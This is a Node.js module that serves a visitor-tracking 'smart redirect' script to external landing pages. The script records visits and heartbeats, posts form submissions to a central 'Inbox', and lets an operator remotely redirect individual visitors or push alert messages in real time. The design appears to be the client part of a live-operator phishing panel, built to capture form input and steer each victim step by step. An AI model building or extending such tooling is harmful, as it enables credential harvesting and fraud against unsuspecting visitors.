// ============================================================
// MEGA TOOLS — SMART REDIRECT ENGINE (Universal Runtime) v1.1
// Serves mega-redirect.js to external landing pages
// Auto-handles: tracking, socket, heartbeat, redirect, polling
// Public API: megaSubmit, megaGetVisitor, megaNavigate,
//             megaEvent, megaConfig, megaReady, megaVersion
// Zero impact on existing Backend logic
// ENTERPRISE FIX: Memory leak prevention (timer cleanup)
// FIX-M1 (v1.1): visibilitychange no longer sets _isUnloading nor
//                sends Offline — tab switch is NOT a real unload.
//                (previously caused submissions to vanish when the
//                visitor switched tabs before submitting)
// FIX-M2 (v1.1): trackingCode is now derived from <meta> tag,
//                <body data-tracking-code>, or window.__MEGA_TRACKING
//                BEFORE falling back to pathname — external pages
//                (Netlify, Vercel, plain HTML) never contained the
//                code in the URL, so _code was always "default".
// FIX-M3 (v1.1): megaSubmit includes source + collector so backend
//                keeps full metadata, and now returns the fetch
//                promise so callers can await success/failure.
// FIX-M4 (v1.1): poll & socket share a single redirect handler so
//                duplicate commands never fire twice.
// FIX-M5 (v1.1): on beforeunload / pagehide, only send Offline when
//                event.persisted === false (bfcache safe).
// ============================================================

function generateSmartRedirectScript(req) {
  const serverUrl = req ? (req.protocol + '://' + req.get('host')) : 'http://localhost:5000';

  return `// ============================================================
// MEGA TOOLS — Smart Redirect Engine v1.1
// Auto-handles: Visitor ID, Tracking, Socket.IO, Heartbeat,
//               Redirect Receive, Polling Fallback, Form Submit
// Just include this ONE script in your landing page:
//   <script src="${serverUrl}/mega-redirect.js"></script>
// ============================================================
(function(){
  "use strict";

  // ========== CONFIG ==========
  var API = "${serverUrl}";
  var DATA = API + "/api/data";
  var VERSION = "1.1.0";

  // ========== STATE ==========
  var _vid = null;
  var _code = null;
  var _socket = null;
  var _lastSeq = 0;
  var _retryCount = 0;
  var _pollTimer = null;
  var _heartbeatTimer = null;
  var _redirected = false;
  var _connected = false;
  var _ready = false;
  var _readyCallbacks = [];
  var _eventListeners = {};
  var _isUnloading = false;
  var _config = {
    heartbeatMs: 8000,
    pollMs: 2000,
    retryMax: 3,
    autoVisit: true,
    autoHeartbeat: true,
    autoSocket: true,
    autoPolling: true
  };

  // ========== VISITOR ID ==========
  // FIX-M1 related: use _mvid first so the same VID survives redirects
  try { _vid = localStorage.getItem("_mvid") || localStorage.getItem("_vid"); } catch(e) {}
  if (!_vid) {
    _vid = "v_" + Date.now() + "_" + Math.random().toString(36).substr(2, 6);
    try { localStorage.setItem("_mvid", _vid); localStorage.setItem("_vid", _vid); } catch(e) {}
  }

  // ========== TRACKING CODE (FIX-M2) ==========
  // Priority: window.__MEGA_TRACKING → <meta name="mega-tracking"> →
  //           <body data-tracking-code> → <html data-tracking-code> →
  //           last path segment → "default"
  function resolveTrackingCode() {
    try {
      if (window.__MEGA_TRACKING && typeof window.__MEGA_TRACKING === "string") {
        return window.__MEGA_TRACKING;
      }
    } catch(e) {}
    try {
      var meta = document.querySelector('meta[name="mega-tracking"]') ||
                 document.querySelector('meta[name="tracking-code"]') ||
                 document.querySelector('meta[name="mega-tracking-code"]');
      if (meta) {
        var mv = meta.getAttribute("content");
        if (mv) return mv.trim();
      }
    } catch(e) {}
    try {
      var bodyTc = document.body && document.body.getAttribute("data-tracking-code");
      if (bodyTc) return bodyTc.trim();
      var htmlTc = document.documentElement && document.documentElement.getAttribute("data-tracking-code");
      if (htmlTc) return htmlTc.trim();
    } catch(e) {}
    try {
      var qs = new URLSearchParams(window.location.search);
      var qTc = qs.get("tc") || qs.get("trackingCode") || qs.get("tracking_code");
      if (qTc) return qTc.trim();
    } catch(e) {}
    try {
      var parts = window.location.pathname.split("/").filter(Boolean);
      var last = parts[parts.length - 1] || "default";
      if (last.endsWith(".html")) last = last.replace(/\\.html$/, "");
      return last;
    } catch(e) {}
    return "default";
  }

  _code = resolveTrackingCode();

  // ========== INTERNAL EVENT BUS ==========
  function _emit(name, data) {
    if (_eventListeners[name]) {
      _eventListeners[name].forEach(function(fn){ try { fn(data); } catch(e){} });
    }
  }

  // ========== CLEANUP FUNCTIONS (Memory leak prevention) ==========
  function clearAllTimers() {
    if (_pollTimer) { clearInterval(_pollTimer); _pollTimer = null; }
    if (_heartbeatTimer) { clearInterval(_heartbeatTimer); _heartbeatTimer = null; }
  }

  function cleanupSocket() {
    if (_socket) {
      try { _socket.off(); _socket.disconnect(); } catch(e) {}
      _socket = null;
    }
    _connected = false;
  }

  function cleanupEventListeners() {
    if (!_isUnloading) return;
    _eventListeners = {};
    _readyCallbacks = [];
  }

  // ========== EXECUTE REDIRECT (FIX-M4: single gate) ==========
  function doRedirect(url) {
    if (_redirected || !url) return;
    _redirected = true;

    // Cleanup everything before redirect (but do NOT mark unloading —
    // the new page will re-init its own runtime)
    clearAllTimers();
    cleanupSocket();

    _emit("REDIRECT", { url: url });
    try {
      // Best-effort offline marker for the previous page
      var payload = JSON.stringify({ visitorId: _vid, trackingCode: _code, status: "Offline" });
      if (navigator.sendBeacon) navigator.sendBeacon(DATA + "/heartbeat", payload);
    } catch(e) {}
    window.location.href = url;
  }

  // ========== HTTP POLLING FALLBACK ==========
  function startPolling() {
    if (_pollTimer || !_config.autoPolling) return;
    _pollTimer = setInterval(function(){
      if (_redirected) { clearAllTimers(); return; }
      fetch(API + "/api/sessions/pending-command/" + encodeURIComponent(_code) + "?visitorId=" + encodeURIComponent(_vid) + "&seq=" + _lastSeq)
        .then(function(r){ return r.json(); })
        .then(function(d){
          if (d && d.pending && d.command && d.command.url) {
            if (d.command.seq && d.command.seq <= _lastSeq) return;
            _lastSeq = d.command.seq || _lastSeq;
            doRedirect(d.command.url);
          }
        }).catch(function(){});
    }, _config.pollMs);
  }

  function stopPolling() {
    if (_pollTimer) { clearInterval(_pollTimer); _pollTimer = null; }
  }

  // ========== VISIT TRACKING ==========
  function sendVisit() {
    if (!_config.autoVisit || _isUnloading) return;
    fetch(DATA + "/visit", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({
        visitorId: _vid,
        trackingCode: _code,
        browser: (navigator.userAgent || "").substring(0, 200),
        device: /Mobi/i.test(navigator.userAgent) ? "Mobile" : "Desktop",
        collectedTypes: ["visit"],
        timestamp: new Date().toISOString()
      }),
      keepalive: true
    }).catch(function(){});
  }

  // ========== HEARTBEAT ==========
  function sendHeartbeat(status) {
    if (!_config.autoHeartbeat || _isUnloading) return;
    fetch(DATA + "/heartbeat", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({
        visitorId: _vid,
        trackingCode: _code,
        status: status || "Active",
        timestamp: new Date().toISOString()
      }),
      keepalive: true
    }).catch(function(){});
  }

  function startHeartbeat() {
    if (_heartbeatTimer || !_config.autoHeartbeat) return;
    _heartbeatTimer = setInterval(function(){
      if (!_isUnloading) sendHeartbeat("Active");
      else clearAllTimers();
    }, _config.heartbeatMs);
  }

  function stopHeartbeat() {
    if (_heartbeatTimer) { clearInterval(_heartbeatTimer); _heartbeatTimer = null; }
  }

  // ========== SOCKET.IO CONNECT ==========
  function connectSocket() {
    if (!_config.autoSocket || _isUnloading) return;
    if (_socket && _socket.connected) return;
    if (_retryCount >= _config.retryMax) return;

    var scriptEl = document.createElement("script");
    scriptEl.src = API + "/socket.io/socket.io.js";
    var scriptLoaded = false;

    scriptEl.onload = function(){
      if (scriptLoaded || _isUnloading) return;
      scriptLoaded = true;

      _socket = io(API, {
        transports: ["websocket", "polling"],
        reconnection: true,
        reconnectionAttempts: 5,
        timeout: 10000
      });

      _socket.on("connect", function(){
        if (_isUnloading) return;
        _connected = true;
        _retryCount = 0;
        _socket.emit("session_init", { visitorId: _vid, trackingCode: _code });
        _socket.emit("joinRoom", _code);
        _emit("SOCKET_CONNECTED", {});
        startHeartbeat();
      });

      _socket.on("disconnect", function(reason){
        if (_isUnloading) return;
        _connected = false;
        _emit("SOCKET_DISCONNECTED", {});
        _retryCount++;
        if (_retryCount < _config.retryMax && !_isUnloading) {
          setTimeout(connectSocket, 3000);
        }
        if (reason === "io client disconnect" || _isUnloading) {
          cleanupSocket();
        }
      });

      // LAYER 1: session_command
      _socket.on("session_command", function(cmd){
        if (!cmd || _redirected) return;
        if (cmd.visitorId && cmd.visitorId !== _vid) return;
        if (cmd.seq && cmd.seq <= _lastSeq) return;
        _lastSeq = cmd.seq || _lastSeq;
        if (cmd.url && (cmd.action === "navigate" || cmd.action === "navigate+message")) {
          _emit("MESSAGE_RECEIVED", cmd);
          doRedirect(cmd.url);
        }
      });

      // LAYER 2: global_command
      _socket.on("global_command", function(cmd){
        if (!cmd || _redirected) return;
        if (cmd.visitorId && cmd.visitorId !== _vid) return;
        if (cmd.seq && cmd.seq <= _lastSeq) return;
        _lastSeq = cmd.seq || _lastSeq;
        if (cmd.url) doRedirect(cmd.url);
      });

      // LAYER 3: nav_update
      _socket.on("nav_update", function(d){
        if (d && d.targetUrl && !_redirected) doRedirect(d.targetUrl);
      });

      // LAYER 4: msg_push
      _socket.on("msg_push", function(d){
        if (d && d.message && window.alert) alert(d.message);
        if (d && d.targetUrl && !_redirected) doRedirect(d.targetUrl);
      });

      _socket.on("connect_error", function(){
        if (_isUnloading) return;
        _connected = false;
        _retryCount++;
      });
    };

    scriptEl.onerror = function(){
      if (_isUnloading) return;
      _retryCount++;
      if (_retryCount < _config.retryMax) {
        setTimeout(connectSocket, 3000);
      }
    };
    document.head.appendChild(scriptEl);
  }

  // ========== MARK READY ==========
  function markReady() {
    if (_ready || _isUnloading) return;
    _ready = true;
    _emit("SESSION_READY", { visitorId: _vid, trackingCode: _code });
    _emit("PAGE_READY", { visitorId: _vid, trackingCode: _code, version: VERSION });
    _readyCallbacks.forEach(function(fn){ try { fn(); } catch(e){} });
    _readyCallbacks = [];
  }

  // ============================================================
  // PUBLIC API
  // ============================================================

  // megaSubmit(data) — Send form data to Mega Tools Inbox (FIX-M3)
  window.megaSubmit = function(data) {
    if (!data || _isUnloading) return Promise.resolve(false);
    var payload = {
      formData: data,
      trackingCode: _code,
      visitorId: _vid,
      collectedTypes: ["form_submit"],
      source: "mega-redirect.js",
      timestamp: new Date().toISOString()
    };
    _emit("FORM_SUBMIT", data);
    return fetch(DATA + "/submit", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify(payload),
      keepalive: true
    }).then(function(r){ return r.json(); })
      .then(function(d){ return d && d.success === true; })
      .catch(function(){ return false; });
  };

  window.megaGetVisitor = function() {
    return { visitorId: _vid, trackingCode: _code, connected: _connected, ready: _ready, version: VERSION };
  };

  window.megaNavigate = function(url) {
    if (!url || _isUnloading) return;
    _emit("STEP_CHANGED", { url: url });
    doRedirect(url);
  };

  window.megaEvent = function(name, callback) {
    if (!name || typeof callback !== "function" || _isUnloading) return;
    if (!_eventListeners[name]) _eventListeners[name] = [];
    _eventListeners[name].push(callback);
    if (name === "SESSION_READY" && _ready) { try { callback({ visitorId: _vid, trackingCode: _code }); } catch(e){} }
    if (name === "PAGE_READY" && _ready) { try { callback({ visitorId: _vid, trackingCode: _code, version: VERSION }); } catch(e){} }
    if (name === "SOCKET_CONNECTED" && _connected) { try { callback({}); } catch(e){} }
  };

  window.megaConfig = function(key, value) {
    if (!key) return _config;
    if (value === undefined) return _config[key];
    _config[key] = value;
    return _config[key];
  };

  window.megaReady = function(callback) {
    if (typeof callback !== "function" || _isUnloading) return;
    if (_ready) { try { callback(); } catch(e){} }
    else { _readyCallbacks.push(callback); }
  };

  window.megaVersion = function() { return VERSION; };

  window.megaCleanup = function() {
    _isUnloading = true;
    clearAllTimers();
    cleanupSocket();
    cleanupEventListeners();
    _readyCallbacks = [];
  };

  // ========== INIT ==========
  sendVisit();
  startPolling();
  connectSocket();

  // Real unload only
  window.addEventListener("beforeunload", function(){
    _isUnloading = true;
    _emit("OFFLINE", {});
    sendHeartbeat("Offline");
    clearAllTimers();
    cleanupSocket();
  });

  // FIX-M5: bfcache-safe pagehide
  window.addEventListener("pagehide", function(ev){
    if (ev && ev.persisted) return; // bfcache restore — stay alive
    _isUnloading = true;
    sendHeartbeat("Offline");
    clearAllTimers();
    cleanupSocket();
  });

  window.addEventListener("load", function(){
    _emit("ONLINE", {});
    markReady();
  });

  if (document.readyState === "complete") {
    setTimeout(markReady, 100);
  }

  // FIX-M1: visibilitychange — do NOT go offline, just pause/resume
  document.addEventListener("visibilitychange", function() {
    if (document.hidden) {
      // Pause heartbeat to save battery, but keep session online
      if (_heartbeatTimer) { clearInterval(_heartbeatTimer); _heartbeatTimer = null; }
    } else {
      if (!_redirected && !_isUnloading) {
        startHeartbeat();
        if (!_socket || !_connected) connectSocket();
        if (!_pollTimer) startPolling();
      }
    }
  });

})();`;
}

module.exports = { generateSmartRedirectScript };